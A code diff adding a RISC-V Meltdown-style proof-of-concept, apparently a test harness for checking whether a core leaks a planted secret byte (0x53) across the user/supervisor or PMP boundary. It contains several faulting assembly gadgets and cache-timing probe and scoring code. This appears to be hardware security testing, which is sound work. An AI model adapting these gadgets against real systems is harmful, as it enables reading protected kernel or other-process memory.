+        "lbu  t0, 0(%0)\n"
+        "li   t2, 0x11\n"
+        "li   t3, 0x23\n"
+        "li   t4, 0x35\n"
+        "li   t5, 0x47\n"
+        GADGET_DELAY_ASM
+        "andi t0, t0, 0xff\n"
+        "slli t0, t0, 3\n"
+        "add  t0, t0, %3\n"
+        "ld   t0, 0(t0)\n"
+        GADGET_TOUCH_ASM
+#elif MELTDOWN_US_GADGET_VARIANT == 2
+        "lbu  t0, 0(%0)\n"
+        "li   t2, 0x11\n"
+        "li   t3, 0x23\n"
+        "li   t4, 0x35\n"
+        "li   t5, 0x47\n"
+        GADGET_DELAY_ASM
+        "andi t0, t0, 0xff\n"
+        "slli t0, t0, %2\n"
+        "add  t0, t0, %1\n"
+        "lb   t1, 0(t0)\n"
+        "lb   t2, 8(t0)\n"
+        "lb   t3, 16(t0)\n"
+        "lb   t4, 24(t0)\n"
+        "xor  t1, t1, t2\n"
+        "xor  t3, t3, t4\n"
+        "xor  t1, t1, t3\n"
+#elif MELTDOWN_US_GADGET_VARIANT == 3
+        "lbu  t0, 0(%0)\n"
+        "li   t2, 0x53\n"
+        "slli t2, t2, %2\n"
+        "add  t2, t2, %1\n"
+        "mv   t0, t2\n"
+        GADGET_TOUCH_ASM
+#elif MELTDOWN_US_GADGET_VARIANT == 4
+        "lbu  t0, 0(%0)\n"
+        "li   t2, 0x53\n"
+        "slli t2, t2, %2\n"
+        "add  t2, t2, %1\n"
+        "lb   t1, 0(t2)\n"
+        "li   t2, 0x51\n"
+        "slli t2, t2, %2\n"
+        "add  t2, t2, %1\n"
+        "lb   t1, 0(t2)\n"
+        "li   t2, 0x55\n"
+        "slli t2, t2, %2\n"
+        "add  t2, t2, %1\n"
+        "lb   t1, 0(t2)\n"
+        "li   t2, 0x80\n"
+        "slli t2, t2, %2\n"
+        "add  t2, t2, %1\n"
+        "lb   t1, 0(t2)\n"
+#else
+#error "MELTDOWN_US_GADGET_VARIANT must be 0, 1, 2, 3, or 4"
+#endif
+        "meltdown_us_recover_label:\n"
+        "nop\n"
+        :
+        : "r"(secret_va), "r"(probe), "i"(PROBE_SHIFT), "r"(probe_ptrs)
+        : "t0", "t1", "t2", "t3", "t4", "t5", "memory");
+}
+#endif
+
+#if MELTDOWN_US_PMP_SIMPLE_FAULT && !MELTDOWN_US_TOUCH_PROBE_CONTROL
+__attribute__((noinline)) static void run_simple_fault(unsigned long secret_va) {
+    unsigned long recover_pc;
+
+    asm volatile("la %0, meltdown_us_simple_recover_label" : "=r"(recover_pc));
+
+    if (meltdown_arm((void*)recover_pc) < 0) {
+        printf("meltdown-us: arm failed\n");
+        exit(1);
+    }
+
+    asm volatile(
+        ".align 2\n"
+        "meltdown_us_simple_fault_label:\n"
+        "lbu  t0, 0(%0)\n"
+        "meltdown_us_simple_recover_label:\n"
+        "nop\n"
+        :
+        : "r"(secret_va)
+        : "t0", "memory");
+}
+#endif
+
+int main(void) {
+#if MELTDOWN_US_TIMING
+    printf("meltdown-us: main begin\n");
+#endif
+    unsigned long secret_va = meltdown_setup();
+#if MELTDOWN_US_TRAIN_ALIAS
+    unsigned long alias_va = 0;
+#endif
+    unsigned char* mem;
+#if MELTDOWN_US_TIMING
+#if !MELTDOWN_US_DEBUG_ONLY
+    unsigned int hits[PROBE_VALUES];
+#endif
+#endif
+
+    if (secret_va == (unsigned long)-1) {
+        printf("meltdown-us: setup failed\n");
+        exit(1);
+    }
+#if MELTDOWN_US_TRAIN_ALIAS
+    alias_va = meltdown_alias();
+    if (alias_va == (unsigned long)-1 || alias_va == 0) {
+        printf("meltdown-us: alias failed\n");
+        exit(1);
+    }
+#endif
+
+    mem = sbrk(PROBE_BYTES + 128 + (PROBE_VALUES * sizeof(unsigned long)) + 64);
+    if (mem == (void*)-1) {
+        printf("meltdown-us: sbrk failed\n");
+        exit(1);
+    }
+    probe = (unsigned char*)(((unsigned long)mem + 63) & ~63UL);
+    probe_ptrs = (unsigned long*)(((unsigned long)(probe + PROBE_BYTES) + 7) & ~7UL);
+
+    for (unsigned long i = 0; i < PROBE_BYTES; i = i + PROBE_STRIDE) {
+        probe[i] = (unsigned char)i;
+    }
+    for (int i = 0; i < PROBE_VALUES; i = i + 1) {
+        probe_ptrs[i] = (unsigned long)(probe + ((unsigned long)i * PROBE_STRIDE));
+    }
+#if MELTDOWN_US_TIMING
+#if !MELTDOWN_US_DEBUG_ONLY
+    for (int i = 0; i < PROBE_VALUES; i = i + 1) {
+        hits[i] = 0;
+    }
+#endif
+#endif
+
+    printf("meltdown-us: secret_va=0x%x attempts=%d\n", (unsigned int)secret_va, MELTDOWN_US_ATTEMPTS);
+#if MELTDOWN_US_PMP_FAULT
+    printf("meltdown-us: fault_mode=pmp-access\n");
+#if MELTDOWN_US_PMP_SIMPLE_FAULT
+    printf("meltdown-us: pmp_simple_fault=1\n");
+#endif
+#else
+    printf("meltdown-us: fault_mode=page-permission\n");
+#if MELTDOWN_US_CLEAR_NO_SFENCE
+    printf("meltdown-us: clear_no_sfence=1\n");
+#endif
+#if MELTDOWN_US_CLEAR_ACCESSED
+    printf("meltdown-us: clear_accessed=1\n");
+#endif
+#if MELTDOWN_US_NO_FAULT
+    printf("meltdown-us: no_fault=1\n");
+#endif
+#if MELTDOWN_US_TOUCH_PROBE_CONTROL
+    printf("meltdown-us: touch_probe_control=1\n");
+#endif
+#endif
+
+#if MELTDOWN_US_TIMING
+#if !MELTDOWN_US_DEBUG_ONLY
+    unsigned long threshold = calibrate_threshold();
+#else
+    calibrate_threshold();
+#endif
+#endif
+    for (int attempt = 0; attempt < MELTDOWN_US_ATTEMPTS; attempt = attempt + 1) {
+#if MELTDOWN_US_TIMING
+        if (meltdown_flush_probe(probe) < 0) {
+            printf("meltdown-us: flush probe failed\n");
+            exit(1);
+        }
+        fence_all();
+#endif
+#if MELTDOWN_US_TRAIN_ALIAS
+        training_sink = training_sink ^ *(volatile unsigned char*)alias_va;
+        fence_all();
+        if (attempt == 0) {
+            printf("meltdown-us: alias_va=0x%x training value=0x%x\n",
+                   (unsigned int)alias_va, (unsigned int)training_sink);
+        }
+#endif
+#if MELTDOWN_US_PMP_FAULT
+        training_sink = training_sink ^ *(volatile unsigned char*)secret_va;
+        fence_all();
+        if (attempt == 0) {
+            printf("meltdown-us: pmp training value=0x%x\n", (unsigned int)training_sink);
+        }
+        if (meltdown_pmp_secret(1) < 0) {
+            printf("meltdown-us: pmp deny failed\n");
+            exit(1);
+        }
+        fence_all();
+        if (attempt == 0) {
+            printf("meltdown-us: pmp deny armed\n");
+        }
+#endif
+#if MELTDOWN_US_TRAIN_USER_ACCESS
+        if (meltdown_set_secret_user(1) < 0) {
+            printf("meltdown-us: set secret user failed\n");
+            exit(1);
+        }
+        training_sink = training_sink ^ *(volatile unsigned char*)secret_va;
+        fence_all();
+#if MELTDOWN_US_PRELOAD_ON_CLEAR
+        if (meltdown_set_secret_user(2) < 0) {
+#elif MELTDOWN_US_CLEAR_NO_SFENCE
+        if (meltdown_set_secret_user(3) < 0) {
+#elif MELTDOWN_US_CLEAR_ACCESSED
+        if (meltdown_set_secret_user(4) < 0) {
+#elif MELTDOWN_US_NO_FAULT
+        if (meltdown_set_secret_user(1) < 0) {
+#else
+        if (meltdown_set_secret_user(0) < 0) {
+#endif
+            printf("meltdown-us: clear secret user failed\n");
+            exit(1);
+        }
+        fence_all();
+        if (attempt == 0) {
+            printf("meltdown-us: training value=0x%x\n", (unsigned int)training_sink);
+        }
+#endif
+#if MELTDOWN_US_TIMING && MELTDOWN_US_DEBUG_RESIDENCY
+        print_residency("pre", attempt);
+#endif
+#if MELTDOWN_US_TOUCH_PROBE_CONTROL
+        touch_probe_bucket(0x53);
+#elif MELTDOWN_US_PMP_SIMPLE_FAULT
+        run_simple_fault(secret_va);
+#else
+        run_faulting_gadget(secret_va);
+#endif
+#if MELTDOWN_US_PMP_FAULT
+        if (meltdown_pmp_secret(0) < 0) {
+            printf("meltdown-us: pmp clear failed\n");
+            exit(1);
+        }
+        fence_all();
+#endif
+#if MELTDOWN_US_TIMING
+#if MELTDOWN_US_DEBUG_RESIDENCY
+        print_residency("post", attempt);
+#endif
+#if MELTDOWN_US_DEBUG_TIMES
+        int raw53 = (int)meltdown_probe_time_one(probe, 0x53);
+        int raw00 = (int)meltdown_probe_time_one(probe, 0x00);
+        int raw80 = (int)meltdown_probe_time_one(probe, 0x80);
+        int raw01 = (int)meltdown_probe_time_one(probe, 0x01);
+        int raw55 = (int)meltdown_probe_time_one(probe, 0x55);
+        int raw51 = (int)meltdown_probe_time_one(probe, 0x51);
+        int raw56 = (int)meltdown_probe_time_one(probe, 0x56);
+        int raw50 = (int)meltdown_probe_time_one(probe, 0x50);
+        int raw54 = (int)meltdown_probe_time_one(probe, 0x54);
+        int raw52 = (int)meltdown_probe_time_one(probe, 0x52);
+        printf("meltdown-us: raw attempt=%d i53=%d i0=%d i80=%d i1=%d i55=%d i51=%d i56=%d i50=%d i54=%d i52=%d\n",
+               attempt,
+               raw53, raw00, raw80, raw01, raw55, raw51, raw56, raw50, raw54, raw52);
+#if MELTDOWN_US_DEBUG_ONLY
+        continue;
+#endif
+#endif
+#if !MELTDOWN_US_DEBUG_ONLY
+        unsigned int round_hits[PROBE_VALUES];
+        if (meltdown_probe(probe, threshold, round_hits) < 0) {
+            printf("meltdown-us: probe failed\n");
+            exit(1);
+        }
+        for (int i = 0; i < PROBE_VALUES; i = i + 1) {
+            hits[i] = hits[i] + round_hits[i];
+        }
+#endif
+#endif
+    }
+
+#if MELTDOWN_US_TIMING
+#if MELTDOWN_US_DEBUG_ONLY
+    printf("meltdown-us: fault recovery ok\n");
+    printf("meltdown-us: debug-only done secret=0x53\n");
+#else
+    int best;
+    int second;
+    unsigned int best_score;
+    unsigned int second_score;
+    top_two(hits, &best, &best_score, &second, &second_score);
+
+    printf("meltdown-us: fault recovery ok\n");
+    printf("meltdown-us: score best=0x%x/%d second=0x%x/%d secret=0x53\n",
+           best, best_score, second, second_score);
+    if (best == 0x53) {
+        printf("meltdown-us: leak candidate ok\n");
+    } else {
+        printf("meltdown-us: leak candidate miss\n");
+    }
+#endif
+#else
+    printf("meltdown-us: fault recovery ok\n");
+#endif
+    printf("meltdown-us: done\n");
+    meltdown_done(0);
+    exit(0);
+}
